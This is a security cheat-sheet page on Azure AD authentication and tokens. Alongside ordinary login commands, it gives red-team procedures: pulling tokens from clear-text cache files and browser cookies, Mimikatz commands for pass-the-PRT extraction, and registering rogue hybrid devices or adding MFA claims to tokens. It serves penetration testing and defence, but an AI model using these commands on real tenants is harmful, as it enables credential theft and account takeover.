# Azure AD - Access and Tokens

## Connection

When you authenticate to the Microsoft Graph API in PowerShell/CLI, you will be using an application from a Microsoft's tenant.

* [Microsoft Applications ID](https://learn.microsoft.com/fr-fr/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in)

| Name                       | Application ID                       |
|----------------------------|--------------------------------------|
| Microsoft Azure PowerShell | 1950a258-227b-4e31-a9cf-717495945fc2 |	
| Microsoft Azure CLI	     | 04b07795-8ddb-461a-bbee-02f9e1bf7b46 |
| Portail Azure              | c44b4083-3bb0-49c1-b47d-974e53cbdf3c |	

After a successfull authentication, you will get an access token.


### az cli

* Login with credentials
    ```ps1
    az login -u <username> -p <password>
    az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>
    ```
* Get token
    ```ps1
    az account get-access-token
    az account get-access-token --resource-type aad-graph
    ```

Whoami equivalent: `az ad signed-in-user show`


### Azure AD Powershell

* Login with credentials
    ```ps1
    $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential("test@<TENANT NAME>.onmicrosoft.com", $passwd)
    Connect-AzureAD -Credential $creds
    ```


### Az Powershell

* Login with credentials
    ```ps1
    $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>@<TENANT NAME>.onmicrosoft.com", $passwd)
    Connect-AzAccount -Credential $creds
    ```
* Login with service principal secret
    ```ps1
    $password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('<APP-ID>', $password)
    Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d

    ```
* Get token
    ```ps1
    (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
    Get-AzAccessToken -ResourceTypeName MSGraph
    ```


### Microsoft Graph Powershell

* Login with credentials
    ```ps1
    Connect-MgGraph
    Connect-MgGraph -Scopes "User.Read.All", "Group.ReadWrite.All"
    ```
* Login with device code flow
    ```ps1
    Connect-MgGraph -Scopes "User.Read.All", "Group.ReadWrite.All" -UseDeviceAuthentication
    ```

Whoami equivalent: `Get-MgContext`


### External HTTP API

* Login with credentials
    ```ps1
    # TODO
    ```

#### Device Code

Request a device code

```ps1
$body = @{
    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource" =      "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers=@{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```

Go to device login [microsoft.com/devicelogin](https://login.microsoftonline.com/common/oauth2/deviceauth) and input the device code. Then ask for an access token.

```ps1
$body=@{
    "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" =       $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
```


#### Service Principal 

* Request an access token using a **service principal password**
    ```ps1
    curl --location --request POST 'https://login.microsoftonline.com/<tenant-name>/oauth2/v2.0/token' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'client_id=<client-id>' \
    --data-urlencode 'scope=https://graph.microsoft.com/.default' \
    --data-urlencode 'client_secret=<client-secret>' \
    --data-urlencode 'grant_type=client_credentials'
    ```

#### App Secret

An App Secret (also called a client secret) is a string used for securing communication between an application and Azure Active Directory (Azure AD). It is a credential that the application uses along with its client ID to authenticate itself when accessing Azure resources, such as APIs or other services, on behalf of a user or a system.

```ps1
$appid = '<app-id>'
$tenantid = '<tenant-id>'
$secret = '<app-secret>'
 
$body =  @{
    Grant_Type    = "client_credentials"
    Scope         = "https://graph.microsoft.com/.default"
    Client_Id     = $appid
    Client_Secret = $secret
}
 
$connection = Invoke-RestMethod `
    -Uri https://login.microsoftonline.com/$tenantid/oauth2/v2.0/token `
    -Method POST `
    -Body $body

Connect-MgGraph -AccessToken $connection.access_token
```


### Internal HTTP API

> **MSI_ENDPOINT** is an alias for **IDENTITY_ENDPOINT**, and **MSI_SECRET** is an alias for **IDENTITY_HEADER**.

Find `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` from the environment variables: `env`

Most of the time, you want a token for one of these resources: 

* https://graph.microsoft.com
* https://management.azure.com
* https://storage.azure.com
* https://vault.azure.net


* PowerShell
    ```ps1
    curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
    curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
    ```
* Azure Function (Python)
    ```py
    import logging, os
    import azure.functions as func

    def main(req: func.HttpRequest) -> func.HttpResponse:
        logging.info('Python HTTP trigger function processed a request.')
        IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
        IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
        cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
        val = os.popen(cmd).read()
        return func.HttpResponse(val, status_code=200)
    ```


## Access Token

An access token is a type of security token issued by Azure Active Directory (Azure AD) that grants a user or application permission to access resources. These resources could be anything from APIs, web applications, data stored in Azure, or other services that are integrated with Azure AD for authentication and authorization.

Decode access tokens: [jwt.ms](https://jwt.ms/)

* Use the access token with **MgGraph**
    ```ps1
    # use the jwt
    $token = "eyJ0eXAiO..."
    $secure = $token | ConvertTo-SecureString -AsPlainText -Force
    Connect-MgGraph -AccessToken $secure
    ```
* Use the access token with **AzureAD**
    ```powershell
    Connect-AzureAD -AadAccessToken <access-token> -TenantId <tenant-id> -AccountId <account-id>
    ```
* Use the access token with **Az Powershell**
    ```powershell
    Connect-AzAccount -AccessToken <access-token> -AccountId <account-id>
    Connect-AzAccount -AccessToken <access-token> -GraphAccessToken <graph-access-token> -AccountId <account-id>
    ```
* Use the access token with the **API**
    ```powershell
    $Token = 'eyJ0eX..'
    $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
    # $URI = 'https://graph.microsoft.com/v1.0/applications'
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
            'Authorization' = "Bearer $Token"
        }
    }
    (Invoke-RestMethod @RequestParams).value 
    ```


### Access Token Locations

Tokens are stored by default on the disk in you use **Azure Cloud Shell**. They canbe extracted by dumping the content of the storage account.

* az cli
    * az cli stores access tokens in clear text in **accessTokens.json** in the directory `C:\Users\<username>\.Azure`
    * azureProfile.json in the same directory contains information about subscriptions.

* Az PowerShell
    * Az PowerShell stores access tokens in clear text in **TokenCache.dat** in the directory `C:\Users\<username>\.Azure`
    * It also stores **ServicePrincipalSecret** in clear-text in **AzureRmContext.json** 
    * Users can save tokens using `Save-AzContext`


## Refresh Token

* Requesting a token using credentials
    ```ps1
    TODO
    ```


### Get a Refresh Token from ESTSAuth Cookie

`ESTSAuthPersistent` is only useful when a CA policy actually grants a persistent session. Otherwise, you should use `ESTSAuth`.

```ps1
TokenTacticsV2> Get-AzureTokenFromESTSCookie -ESTSAuthCookie "0.AS8"
TokenTacticsV2> Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."
```


### Get a Refresh Token from Office process

* [trustedsec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)
```ps1
load bofloader
execute_bof /opt/CS-Remote-OPs-BOF/Remote/office_tokens/office_tokens.x64.o --format-string i  7324
```


## FOCI Refresh Token

FOCI allows applications registered with Azure AD to share tokens, minimizing the need for separate authentications when a user accesses multiple applications that are part of the same "family."

* [secureworks/family-of-client-ids-research/](https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt) - Research into Undocumented Behavior of Azure AD Refresh Tokens

**Generate tokens**   

```ps1
roadtx gettokens --refresh-token <refresh-token> -c <foci-id> -r https://graph.microsoft.com 
roadtx gettokens --refresh-token <refresh-token> -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46
```

```
scope               resource                                client                              
.default            04b07795-8ddb-461a-bbee-02f9e1bf7b46    04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    1950a258-227b-4e31-a9cf-717495945fc2    1950a258-227b-4e31-a9cf-717495945fc2
                    https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    https://graph.windows.net               00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
Files.Read.All      d3590ed6-52b3-4102-aeff-aad2292ab01c    d3590ed6-52b3-4102-aeff-aad2292ab01c
                    https://graph.microsoft.com             3590ed6-52b3-4102-aeff-aad2292ab01c
                    https://outlook.office.com              1fec8e78-bce4-4aaf-ab1b-5451cc387264
Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
                    https://outlook.office365.com           00b41c95-dab0-4487-9791-b9d2c32c80f2
```


## Primary Refresh Token

A Primary Refresh Token (PRT) is a key artifact in the authentication and identity management process in Microsoft's Azure AD (Azure Active Directory) environment. The PRT is primarily used for maintaining a seamless sign-in experience on devices. 

:warning: A PRT is valid for 90 days and is continuously renewed as long as the device is in use. However, it's only valid for 14 days if the device is not in use. 

* Use PRT token
    ```ps1
    roadtx browserprtauth --prt <prt-token> --prt-sessionkey <session-key>
    roadtx browserprtauth --prt roadtx.prt -url http://www.office.com
    ```


### Extract PRT v1 - Pass-the-PRT

MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).

* Use mimikatz to extract the PRT and session key
    ```ps1
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::cloudap
    mimikatz # sekurlsa::dpapi
    mimikatz # dpapi::cloudapkd /keyvalue:<key-value> /unprotect
    mimikatz # dpapi::cloudapkd /context:<context> /derivedkey:<derived-key> /Prt:<prt>
    ```
* Use either roadtx or AADInternals to generate a new PRT token
    ```ps1
    roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url https://portal.azure.com

    PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
    PS AADInternals> $PRT_OF_USER = '...'
    PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
    PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
    PS AADInternals> $ClearKey = "XXYYZZ..."
    PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
    PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
    ```


### Extract PRT on Device with TPM

* No method known to date.


### Request a PRT using the Refresh Flow

* Request a nonce from AAD: `roadrecon auth --prt-init -t <tenant-id>`
* Use [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken) or [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof) to initiate a new PRT request.
* `roadrecon auth --prt-cookie <prt-cookie> --tokens-stdout --debug` or  `roadtx gettoken --prt-cookie <x-ms-refreshtokencredential>`
* Then browse to [login.microsoftonline.com](https://login.microsoftonline.com) with a cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>`
    ```powershell
    Name: x-ms-RefreshTokenCredential
    Value: <Signed JWT>
    HttpOnly: √
    ```

:warning: Mark the cookie with the flags `HTTPOnly` and `Secure`.


### Request a PRT with Hybrid Device

Requirements:

* ADDS user credentials
* hybrid environment (ADDS and Azure AD)

Use the user account to create a computer and request a PRT

* Create a computer account in AD: `impacket-addcomputer <domain>/<username>:<password> -dc-ip <dc-ip>`
* Configure the computer certificate in AD with [dirkjanm/roadtools_hybrid](https://github.com/dirkjanm/roadtools_hybrid): `python setcert.py 10.10.10.10  -t '<machine-account$>' -u '<domain>\<machine-account$>' -p <machine-password>`
* Register the hybrid device in Azure AD with this certificate: `roadtx hybriddevice -c '<machine-account>.pem' -k '<machine-account>.key' --sid '<device-sid>' -t '<aad-tenant-id>'`
* Get a PRT with device claim

    ```ps1
    roadtx prt -c <hybrid-device-name>.pem -k <hybrid-device-name>.key -u <username>@h<domain> -p <password>
    roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
    ```


### Upgrade Refresh Token to PRT

* Get correct token audience: `roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file`
* Registering device: `roadtx device -a register -n <device-name>`
* Request PRT `roadtx prt --refresh-token <refresh-token> -c <device-name>.pem -k <device-name>.key`
* Use a PRT: `roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com`


### Enriching a PRT with MFA claim

* Request a special refresh token: `roadtx prtenrich -u username@domain`
* Request a PRT with MFA claim: `roadtx prt -r <refreshtoken> -c <device>.pem -k <device>.key`


## References

* [Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema - April 16, 2020](https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/)
* [Hacking Your Cloud: Tokens Edition 2.0 - Edwin David - April 13, 2023](https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0)
* [Microsoft 365 Developer Program](https://developer.microsoft.com/en-us/microsoft-365/dev-program)
* [PRT Abuse from Userland with Cobalt Strike - 0xbad53c](https://red.0xbad53c.com/red-team-operations/azure-and-o365/prt-abuse-from-userland-with-cobalt-strike)
* [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94)
* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert - AADInternals.com - September 01, 2020](https://aadinternals.com/post/prt/)
* [Get Access Tokens for Managed Service Identity on Azure App Service](https://zhiliaxu.github.io/app-service-managed-identity.html)
* [Attacking Azure Cloud shell - Karl Fosaaen - December 10, 2019](https://blog.netspi.com/attacking-azure-cloud-shell/)
* [Azure AD Pass The Certificate - Mor - Aug 19, 2020](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)
* [Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020](https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/)
* [Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020](https://www.lares.com/hunting-azure-admins-for-vertical-escalation/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
* [Understanding Tokens in Entra ID: A Comprehensive Guide - Lina Lau - September 18, 2024](https://www.xintra.org/blog/tokens-in-entra-id-guide)